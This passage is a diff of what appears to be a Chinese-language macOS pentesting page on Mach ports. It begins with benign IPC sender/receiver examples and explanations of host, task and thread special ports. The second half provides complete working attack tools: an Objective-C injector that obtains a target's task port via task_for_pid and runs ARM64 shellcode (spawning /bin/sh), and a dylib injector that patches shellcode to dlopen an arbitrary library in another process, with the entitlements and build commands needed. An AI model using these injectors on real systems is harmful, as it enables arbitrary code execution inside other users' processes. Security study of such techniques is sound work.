+kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
+if (kr != KERN_SUCCESS) {
+printf("bootstrap_register() failed with code 0x%x\n", kr);
+return 1;
+}
+printf("bootstrap_register()'ed our port\n");
+
+
+// Wait for a message.
+struct {
+mach_msg_header_t header;
+char some_text[10];
+int some_number;
+mach_msg_trailer_t trailer;
+} message;
+
+kr = mach_msg(
+&amp;message.header,  // Same as (mach_msg_header_t *) &amp;message.
+MACH_RCV_MSG,     // Options. We're receiving a message.
+0,                // Size of the message being sent, if sending.
+sizeof(message),  // Size of the buffer for receiving.
+port,             // The port to receive a message on.
+MACH_MSG_TIMEOUT_NONE,
+MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
+);
+if (kr != KERN_SUCCESS) {
+printf("mach_msg() failed with code 0x%x\n", kr);
+return 1;
+}
+printf("Got a message\n");
+
+message.some_text[9] = 0;
+printf("Text: %s, number: %d\n", message.some_text, message.some_number);
+}
+</code></pre>
+<p>{% endtab %}</p>
+<p>{% tab title="sender.c" %}</p>
+<pre><code class="language-c">// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
+// gcc sender.c -o sender
+
+#include &lt;stdio.h&gt;
+#include &lt;mach/mach.h&gt;
+#include &lt;servers/bootstrap.h&gt;
+
+int main() {
+
+// Lookup the receiver port using the bootstrap server.
+mach_port_t port;
+kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &amp;port);
+if (kr != KERN_SUCCESS) {
+printf("bootstrap_look_up() failed with code 0x%x\n", kr);
+return 1;
+}
+printf("bootstrap_look_up() returned port right name %d\n", port);
+
+
+// Construct our message.
+struct {
+mach_msg_header_t header;
+char some_text[10];
+int some_number;
+} message;
+
+message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
+message.header.msgh_remote_port = port;
+message.header.msgh_local_port = MACH_PORT_NULL;
+
+strncpy(message.some_text, "Hello", sizeof(message.some_text));
+message.some_number = 35;
+
+// Send the message.
+kr = mach_msg(
+&amp;message.header,  // Same as (mach_msg_header_t *) &amp;message.
+MACH_SEND_MSG,    // Options. We're sending a message.
+sizeof(message),  // Size of the message being sent.
+0,                // Size of the buffer for receiving.
+MACH_PORT_NULL,   // A port to receive a message on, if receiving.
+MACH_MSG_TIMEOUT_NONE,
+MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
+);
+if (kr != KERN_SUCCESS) {
+printf("mach_msg() failed with code 0x%x\n", kr);
+return 1;
+}
+printf("Sent a message\n");
+}
+</code></pre>
+<p>{% endtab %}
+{% endtabs %}</p>
+<h2 id="特权端口"><a class="header" href="#特权端口">特权端口</a></h2>
+<p>有一些特殊端口允许在任务对其具有 <strong>SEND</strong> 权限的情况下 <strong>执行某些敏感操作或访问某些敏感数据</strong>。这使得这些端口从攻击者的角度来看非常有趣，不仅因为其能力，还因为可以 <strong>在任务之间共享 SEND 权限</strong>。</p>
+<h3 id="主机特殊端口"><a class="header" href="#主机特殊端口">主机特殊端口</a></h3>
+<p>这些端口由一个数字表示。</p>
+<p><strong>SEND</strong> 权限可以通过调用 <strong><code>host_get_special_port</code></strong> 获得，而 <strong>RECEIVE</strong> 权限则通过调用 <strong><code>host_set_special_port</code></strong> 获得。然而，这两个调用都需要 <strong><code>host_priv</code></strong> 端口，只有 root 可以访问。此外，在过去，root 能够调用 <strong><code>host_set_special_port</code></strong> 并劫持任意端口，例如通过劫持 <code>HOST_KEXTD_PORT</code> 来绕过代码签名（SIP 现在防止了这一点）。</p>
+<p>这些端口分为两组：<strong>前 7 个端口由内核拥有</strong>，分别是 1 <code>HOST_PORT</code>、2 <code>HOST_PRIV_PORT</code>、3 <code>HOST_IO_MASTER_PORT</code>，7 是 <code>HOST_MAX_SPECIAL_KERNEL_PORT</code>。<br />
+从数字 <strong>8</strong> 开始的端口是 <strong>由系统守护进程拥有</strong>，可以在 <a href="https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host_special_ports.h.auto.html"><strong><code>host_special_ports.h</code></strong></a> 中找到声明。</p>
+<ul>
+<li><strong>主机端口</strong>：如果一个进程对这个端口具有 <strong>SEND</strong> 权限，它可以通过调用其例程获取 <strong>系统</strong> 信息，例如：</li>
+<li><code>host_processor_info</code>: 获取处理器信息</li>
+<li><code>host_info</code>: 获取主机信息</li>
+<li><code>host_virtual_physical_table_info</code>: 虚拟/物理页表（需要 MACH_VMDEBUG）</li>
+<li><code>host_statistics</code>: 获取主机统计信息</li>
+<li><code>mach_memory_info</code>: 获取内核内存布局</li>
+<li><strong>主机特权端口</strong>：对这个端口具有 <strong>SEND</strong> 权限的进程可以执行 <strong>特权操作</strong>，例如显示启动数据或尝试加载内核扩展。<strong>进程需要是 root</strong> 才能获得此权限。</li>
+<li>此外，为了调用 <strong><code>kext_request</code></strong> API，需要拥有其他权限 <strong><code>com.apple.private.kext*</code></strong>，这些权限仅授予 Apple 二进制文件。</li>
+<li>可以调用的其他例程包括：</li>
+<li><code>host_get_boot_info</code>: 获取 <code>machine_boot_info()</code></li>
+<li><code>host_priv_statistics</code>: 获取特权统计信息</li>
+<li><code>vm_allocate_cpm</code>: 分配连续物理内存</li>
+<li><code>host_processors</code>: 发送权限到主机处理器</li>
+<li><code>mach_vm_wire</code>: 使内存常驻</li>
+<li>由于 <strong>root</strong> 可以访问此权限，它可以调用 <code>host_set_[special/exception]_port[s]</code> 来 <strong>劫持主机特殊或异常端口</strong>。</li>
+</ul>
+<p>可以通过运行以下命令 <strong>查看所有主机特殊端口</strong>：</p>
+<pre><code class="language-bash">procexp all ports | grep "HSP"
+</code></pre>
+<h3 id="task-special-ports"><a class="header" href="#task-special-ports">Task Special Ports</a></h3>
+<p>这些是为知名服务保留的端口。可以通过调用 <code>task_[get/set]_special_port</code> 来获取/设置它们。它们可以在 <code>task_special_ports.h</code> 中找到：</p>
+<pre><code class="language-c">typedef	int	task_special_port_t;
+
+#define TASK_KERNEL_PORT	1	/* Represents task to the outside
+world.*/
+#define TASK_HOST_PORT		2	/* The host (priv) port for task.  */
+#define TASK_BOOTSTRAP_PORT	4	/* Bootstrap environment for task. */
+#define TASK_WIRED_LEDGER_PORT	5	/* Wired resource ledger for task. */
+#define TASK_PAGED_LEDGER_PORT	6	/* Paged resource ledger for task. */
+</code></pre>
+<p>从 <a href="https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html">这里</a>:</p>
+<ul>
+<li><strong>TASK_KERNEL_PORT</strong>[task-self send right]: 用于控制此任务的端口。用于发送影响任务的消息。这是 <strong>mach_task_self（见下文的任务端口）</strong> 返回的端口。</li>
+<li><strong>TASK_BOOTSTRAP_PORT</strong>[bootstrap send right]: 任务的引导端口。用于发送请求返回其他系统服务端口的消息。</li>
+<li><strong>TASK_HOST_NAME_PORT</strong>[host-self send right]: 用于请求包含主机信息的端口。这是 <strong>mach_host_self</strong> 返回的端口。</li>
+<li><strong>TASK_WIRED_LEDGER_PORT</strong>[ledger send right]: 命名此任务从中提取其有线内核内存的源的端口。</li>
+<li><strong>TASK_PAGED_LEDGER_PORT</strong>[ledger send right]: 命名此任务从中提取其默认内存管理内存的源的端口。</li>
+</ul>
+<h3 id="任务端口"><a class="header" href="#任务端口">任务端口</a></h3>
+<p>最初 Mach 没有“进程”，它有“任务”，被认为更像是线程的容器。当 Mach 与 BSD 合并时，<strong>每个任务与一个 BSD 进程相关联</strong>。因此，每个 BSD 进程都有其作为进程所需的详细信息，每个 Mach 任务也有其内部工作（除了不存在的 pid 0，即 <code>kernel_task</code>）。</p>
+<p>与此相关的有两个非常有趣的函数：</p>
+<ul>
+<li><code>task_for_pid(target_task_port, pid, &amp;task_port_of_pid)</code>: 获取与指定的 <code>pid</code> 相关的任务的任务端口的发送权限，并将其授予指定的 <code>target_task_port</code>（通常是使用 <code>mach_task_self()</code> 的调用任务，但也可以是不同任务上的发送端口。）</li>
+<li><code>pid_for_task(task, &amp;pid)</code>: 给定一个任务的发送权限，查找该任务相关的 PID。</li>
+</ul>
+<p>为了在任务内执行操作，任务需要对自己调用 <code>mach_task_self()</code> 的 <code>SEND</code> 权限（使用 <code>task_self_trap</code>（28））。有了这个权限，任务可以执行多个操作，例如：</p>
+<ul>
+<li><code>task_threads</code>: 获取任务线程的所有任务端口的发送权限</li>
+<li><code>task_info</code>: 获取有关任务的信息</li>
+<li><code>task_suspend/resume</code>: 暂停或恢复任务</li>
+<li><code>task_[get/set]_special_port</code></li>
+<li><code>thread_create</code>: 创建线程</li>
+<li><code>task_[get/set]_state</code>: 控制任务状态</li>
+<li>更多内容可以在 <a href="https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h"><strong>mach/task.h</strong></a> 中找到</li>
+</ul>
+<p>{% hint style="danger" %}
+请注意，拥有 <strong>不同任务</strong> 的任务端口的发送权限，可以对不同任务执行此类操作。
+{% endhint %}</p>
+<p>此外，task_port 也是 <strong><code>vm_map</code></strong> 端口，允许使用 <code>vm_read()</code> 和 <code>vm_write()</code> 等函数 <strong>读取和操作内存</strong>。这基本上意味着，拥有不同任务的 task_port 的发送权限的任务将能够 <strong>注入代码到该任务中</strong>。</p>
+<p>请记住，因为 <strong>内核也是一个任务</strong>，如果有人设法获得 <strong><code>kernel_task</code></strong> 的 <strong>发送权限</strong>，它将能够使内核执行任何操作（越狱）。</p>
+<ul>
+<li>调用 <code>mach_task_self()</code> 以 <strong>获取此端口的名称</strong>，用于调用任务。此端口仅在 <strong><code>exec()</code></strong> 之间 <strong>继承</strong>；使用 <code>fork()</code> 创建的新任务会获得一个新的任务端口（作为特例，任务在 suid 二进制文件中 <code>exec()</code> 后也会获得一个新的任务端口）。生成任务并获取其端口的唯一方法是在执行 <code>fork()</code> 时进行 <a href="https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html">"port swap dance"</a>。</li>
+<li>访问端口的限制（来自二进制文件 <code>AppleMobileFileIntegrity</code> 的 <code>macos_task_policy</code>）：</li>
+<li>如果应用具有 <strong><code>com.apple.security.get-task-allow</code> 权限</strong>，则来自 <strong>同一用户的进程可以访问任务端口</strong>（通常由 Xcode 添加用于调试）。<strong>公证</strong> 过程不允许其用于生产版本。</li>
+<li>具有 <strong><code>com.apple.system-task-ports</code></strong> 权限的应用可以获取 <strong>任何</strong> 进程的任务端口，除了内核。在旧版本中称为 <strong><code>task_for_pid-allow</code></strong>。这仅授予 Apple 应用。</li>
+<li><strong>Root 可以访问未使用 <strong>hardened</strong> 运行时（且不是来自 Apple）编译的应用的任务端口</strong>。</li>
+</ul>
+<p><strong>任务名称端口：</strong> 一个未特权版本的 <em>任务端口</em>。它引用任务，但不允许控制它。通过它似乎唯一可用的功能是 <code>task_info()</code>。</p>
+<h3 id="线程端口"><a class="header" href="#线程端口">线程端口</a></h3>
+<p>线程也有相关的端口，可以从调用 <strong><code>task_threads</code></strong> 的任务和使用 <code>processor_set_threads</code> 的处理器中看到。对线程端口的发送权限允许使用 <code>thread_act</code> 子系统中的函数，例如：</p>
+<ul>
+<li><code>thread_terminate</code></li>
+<li><code>thread_[get/set]_state</code></li>
+<li><code>act_[get/set]_state</code></li>
+<li><code>thread_[suspend/resume]</code></li>
+<li><code>thread_info</code></li>
+<li>...</li>
+</ul>
+<p>任何线程都可以通过调用 <strong><code>mach_thread_sef</code></strong> 获取此端口。</p>
+<h3 id="通过任务端口在线程中注入-shellcode"><a class="header" href="#通过任务端口在线程中注入-shellcode">通过任务端口在线程中注入 Shellcode</a></h3>
+<p>您可以从以下位置获取 shellcode：</p>
+<p>{% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
+<a href="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.html">arm64-basic-assembly.md</a>
+{% endcontent-ref %}</p>
+<p>{% tabs %}
+{% tab title="mysleep.m" %}</p>
+<pre><code class="language-objectivec">// clang -framework Foundation mysleep.m -o mysleep
+// codesign --entitlements entitlements.plist -s - mysleep
+
+#import &lt;Foundation/Foundation.h&gt;
+
+double performMathOperations() {
+double result = 0;
+for (int i = 0; i &lt; 10000; i++) {
+result += sqrt(i) * tan(i) - cos(i);
+}
+return result;
+}
+
+int main(int argc, const char * argv[]) {
+@autoreleasepool {
+NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
+processIdentifier]);
+while (true) {
+[NSThread sleepForTimeInterval:5];
+
+performMathOperations();  // Silent action
+
+[NSThread sleepForTimeInterval:5];
+}
+}
+return 0;
+}
+</code></pre>
+<p>{% endtab %}</p>
+<p>{% tab title="entitlements.plist" %}</p>
+<pre><code class="language-xml">&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;
+&lt;plist version="1.0"&gt;
+&lt;dict&gt;
+&lt;key&gt;com.apple.security.get-task-allow&lt;/key&gt;
+&lt;true/&gt;
+&lt;/dict&gt;
+&lt;/plist&gt;
+</code></pre>
+<p>{% endtab %}
+{% endtabs %}</p>
+<p><strong>编译</strong>之前的程序并添加<strong>权限</strong>以便能够以相同用户注入代码（如果没有，您将需要使用<strong>sudo</strong>）。</p>
+<details>
+<summary>sc_injector.m</summary>
+```objectivec
+// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
+// Based on https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a?permalink_comment_id=2981669
+// and on https://newosxbook.com/src.jl?tree=listings&file=inject.c
+<p>#import &lt;Foundation/Foundation.h&gt;
+#import &lt;AppKit/AppKit.h&gt;
+#include &lt;mach/mach_vm.h&gt;
+#include &lt;sys/sysctl.h&gt;</p>
+<p>#ifdef <strong>arm64</strong></p>
+<p>kern_return_t mach_vm_allocate
+(
+vm_map_t target,
+mach_vm_address_t *address,
+mach_vm_size_t size,
+int flags
+);</p>
+<p>kern_return_t mach_vm_write
+(
+vm_map_t target_task,
+mach_vm_address_t address,
+vm_offset_t data,
+mach_msg_type_number_t dataCnt
+);</p>
+<p>#else
+#include &lt;mach/mach_vm.h&gt;
+#endif</p>
+<p>#define STACK_SIZE 65536
+#define CODE_SIZE 128</p>
+<p>// ARM64 shellcode that executes touch /tmp/lalala
+char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";</p>
+<p>int inject(pid_t pid){</p>
+<p>task_t remoteTask;</p>
+<p>// Get access to the task port of the process we want to inject into
+kern_return_t kr = task_for_pid(mach_task_self(), pid, &amp;remoteTask);
+if (kr != KERN_SUCCESS) {
+fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
+return (-1);
+}
+else{
+printf("Gathered privileges over the task port of process: %d\n", pid);
+}</p>
+<p>// Allocate memory for the stack
+mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
+mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
+kr = mach_vm_allocate(remoteTask, &amp;remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);</p>
+<p>if (kr != KERN_SUCCESS)
+{
+fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
+return (-2);
+}
+else
+{</p>
+<p>fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
+}</p>
+<p>// Allocate memory for the code
+remoteCode64 = (vm_address_t) NULL;
+kr = mach_vm_allocate( remoteTask, &amp;remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );</p>
+<p>if (kr != KERN_SUCCESS)
+{
+fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
+return (-2);
+}</p>
+<p>// Write the shellcode to the allocated memory
+kr = mach_vm_write(remoteTask,                   // Task port
+remoteCode64,                 // Virtual Address (Destination)
+(vm_address_t) injectedCode,  // Source
+0xa9);                       // Length of the source</p>
+<p>if (kr != KERN_SUCCESS)
+{
+fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
+return (-3);
+}</p>
+<p>// Set the permissions on the allocated code memory
+kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);</p>
+<p>if (kr != KERN_SUCCESS)
+{
+fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
+return (-4);
+}</p>
+<p>// Set the permissions on the allocated stack memory
+kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);</p>
+<p>if (kr != KERN_SUCCESS)
+{
+fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
+return (-4);
+}</p>
+<p>// Create thread to run shellcode
+struct arm_unified_thread_state remoteThreadState64;
+thread_act_t         remoteThread;</p>
+<p>memset(&amp;remoteThreadState64, '\0', sizeof(remoteThreadState64) );</p>
+<p>remoteStack64 += (STACK_SIZE / 2); // this is the real stack
+//remoteStack64 -= 8;  // need alignment of 16</p>
+<p>const char* p = (const char*) remoteCode64;</p>
+<p>remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
+remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
+remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
+remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;</p>
+<p>printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );</p>
+<p>kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
+(thread_state_t) &amp;remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &amp;remoteThread );</p>
+<p>if (kr != KERN_SUCCESS) {
+fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
+return (-3);
+}</p>
+<p>return (0);
+}</p>
+<p>pid_t pidForProcessName(NSString *processName) {
+NSArray *arguments = @[@"pgrep", processName];
+NSTask *task = [[NSTask alloc] init];
+[task setLaunchPath:@"/usr/bin/env"];
+[task setArguments:arguments];</p>
+<p>NSPipe *pipe = [NSPipe pipe];
+[task setStandardOutput:pipe];</p>
+<p>NSFileHandle *file = [pipe fileHandleForReading];</p>
+<p>[task launch];</p>
+<p>NSData *data = [file readDataToEndOfFile];
+NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];</p>
+<p>return (pid_t)[string integerValue];
+}</p>
+<p>BOOL isStringNumeric(NSString <em>str) {
+NSCharacterSet</em> nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
+NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
+return r.location == NSNotFound;
+}</p>
+<p>int main(int argc, const char * argv[]) {
+@autoreleasepool {
+if (argc &lt; 2) {
+NSLog(@"Usage: %s <pid or process name>", argv[0]);
+return 1;
+}</p>
+<p>NSString *arg = [NSString stringWithUTF8String:argv[1]];
+pid_t pid;</p>
+<p>if (isStringNumeric(arg)) {
+pid = [arg intValue];
+} else {
+pid = pidForProcessName(arg);
+if (pid == 0) {
+NSLog(@"Error: Process named '%@' not found.", arg);
+return 1;
+}
+else{
+printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
+}
+}</p>
+<p>inject(pid);
+}</p>
+<p>return 0;
+}</p>
+<pre><code>&lt;/details&gt;
+```bash
+gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
+./inject &lt;pi or string&gt;
+</code></pre>
+<p>{% hint style="success" %}
+要使其在 iOS 上工作，您需要权限 <code>dynamic-codesigning</code> 以便能够创建可写内存可执行文件。
+{% endhint %}</p>
+<h3 id="通过任务端口在线程中注入-dylib"><a class="header" href="#通过任务端口在线程中注入-dylib">通过任务端口在线程中注入 Dylib</a></h3>
+<p>在 macOS 中，<strong>线程</strong> 可以通过 <strong>Mach</strong> 或使用 <strong>posix <code>pthread</code> api</strong> 进行操作。我们在之前的注入中生成的线程是使用 Mach api 生成的，因此 <strong>它不符合 posix 标准</strong>。</p>
+<p>能够 <strong>注入一个简单的 shellcode</strong> 来执行命令是因为它 <strong>不需要与 posix</strong> 兼容的 api 进行工作，只需与 Mach 进行工作。<strong>更复杂的注入</strong> 需要 <strong>线程</strong> 也 <strong>符合 posix 标准</strong>。</p>
+<p>因此，为了 <strong>改进线程</strong>，它应该调用 <strong><code>pthread_create_from_mach_thread</code></strong>，这将 <strong>创建一个有效的 pthread</strong>。然后，这个新的 pthread 可以 <strong>调用 dlopen</strong> 从系统中 <strong>加载一个 dylib</strong>，因此不必编写新的 shellcode 来执行不同的操作，而是可以加载自定义库。</p>
+<p>您可以在以下位置找到 <strong>示例 dylibs</strong>（例如，生成日志的那个，然后您可以监听它）：</p>
+<p>{% content-ref url="../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md" %}
+<a href="../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.html">macos-dyld-hijacking-and-dyld_insert_libraries.md</a>
+{% endcontent-ref %}</p>
+<details>
+<summary>dylib_injector.m</summary>
+```objectivec
+// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
+// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
+#include <dlfcn.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <mach/mach.h>
+#include <mach/error.h>
+#include <errno.h>
+#include <stdlib.h>
+#include <sys/sysctl.h>
+#include <sys/mman.h>
+<p>#include &lt;sys/stat.h&gt;
+#include &lt;pthread.h&gt;</p>
+<p>#ifdef <strong>arm64</strong>
+//#include "mach/arm/thread_status.h"</p>
+<p>// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
+// And I say, bullshit.
+kern_return_t mach_vm_allocate
+(
+vm_map_t target,
+mach_vm_address_t *address,
+mach_vm_size_t size,
+int flags
+);</p>
+<p>kern_return_t mach_vm_write
+(
+vm_map_t target_task,
+mach_vm_address_t address,
+vm_offset_t data,
+mach_msg_type_number_t dataCnt
+);</p>
+<p>#else
+#include &lt;mach/mach_vm.h&gt;
+#endif</p>
+<p>#define STACK_SIZE 65536
+#define CODE_SIZE 128</p>
+<p>char injectedCode[] =</p>
+<p>// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)</p>
+<p>// Call pthread_set_self</p>
+<p>"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
+"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
+"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
+"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
+"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
+"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
+"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
+"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
+"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
+"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
+"\x00\x00\x00\x14" // loop: b loop              ; loop forever</p>
+<p>// Call dlopen with the path to the library
+"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 =&gt; "LIBLIBLIB...";
+"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
+"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
+"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
+"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()</p>
+<p>// Call pthread_exit
+"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
+"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
+"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit</p>
+<p>"PTHRDCRT"  // &lt;-
+"PTHRDEXT"  // &lt;-
+"DLOPEN__"  // &lt;-
+"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
+"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
+"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
+"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
+"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
+"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;</p>
+<p>int inject(pid_t pid, const char *lib) {</p>
+<p>task_t remoteTask;
+struct stat buf;</p>
+<p>// Check if the library exists
+int rc = stat (lib, &amp;buf);</p>
+<p>if (rc != 0)
+{
+fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
+//return (-9);
+}</p>
+<p>// Get access to the task port of the process we want to inject into
+kern_return_t kr = task_for_pid(mach_task_self(), pid, &amp;remoteTask);
+if (kr != KERN_SUCCESS) {
+fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
+return (-1);
+}
+else{
+printf("Gathered privileges over the task port of process: %d\n", pid);
+}</p>
+<p>// Allocate memory for the stack
+mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
+mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
+kr = mach_vm_allocate(remoteTask, &amp;remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);</p>
+<p>if (kr != KERN_SUCCESS)
+{
+fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
+return (-2);
+}
+else
+{</p>
+<p>fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
+}</p>
+<p>// Allocate memory for the code
+remoteCode64 = (vm_address_t) NULL;
+kr = mach_vm_allocate( remoteTask, &amp;remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );</p>
+<p>if (kr != KERN_SUCCESS)
+{
+fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
+return (-2);
+}</p>
+<p>// Patch shellcode</p>
+<p>int i = 0;
+char *possiblePatchLocation = (injectedCode );
+for (i = 0 ; i &lt; 0x100; i++)
+{</p>
+<p>// Patching is crude, but works.
+//
+extern void *_pthread_set_self;
+possiblePatchLocation++;</p>
+<p>uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
+uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
+uint64_t addrOfDlopen = (uint64_t) dlopen;</p>
+<p>if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
+{
+memcpy(possiblePatchLocation, &amp;addrOfPthreadExit,8);
+printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
+}</p>
+<p>if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
+{
+memcpy(possiblePatchLocation, &amp;addrOfPthreadCreate,8);
+printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
+}</p>
+<p>if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
+{
+printf ("DLOpen @%llx\n", addrOfDlopen);
+memcpy(possiblePatchLocation, &amp;addrOfDlopen, sizeof(uint64_t));
+}</p>
+<p>if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
+{
+strcpy(possiblePatchLocation, lib );
+}
+}</p>
+<p>// Write the shellcode to the allocated memory
+kr = mach_vm_write(remoteTask,                   // Task port
+remoteCode64,                 // Virtual Address (Destination)
+(vm_address_t) injectedCode,  // Source
+0xa9);                       // Length of the source</p>
+<p>if (kr != KERN_SUCCESS)
+{
+fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
+return (-3);
+}</p>
+<p>// Set the permissions on the allocated code memory
+kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);</p>
+<p>if (kr != KERN_SUCCESS)
+{
+fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
+return (-4);
+}</p>
+<p>// Set the permissions on the allocated stack memory
+kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);</p>
+<p>if (kr != KERN_SUCCESS)
+{
+fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
+return (-4);
+}</p>
+<p>// Create thread to run shellcode
+struct arm_unified_thread_state remoteThreadState64;
+thread_act_t         remoteThread;</p>
+<p>memset(&amp;remoteThreadState64, '\0', sizeof(remoteThreadState64) );</p>
+<p>remoteStack64 += (STACK_SIZE / 2); // this is the real stack
+//remoteStack64 -= 8;  // need alignment of 16</p>
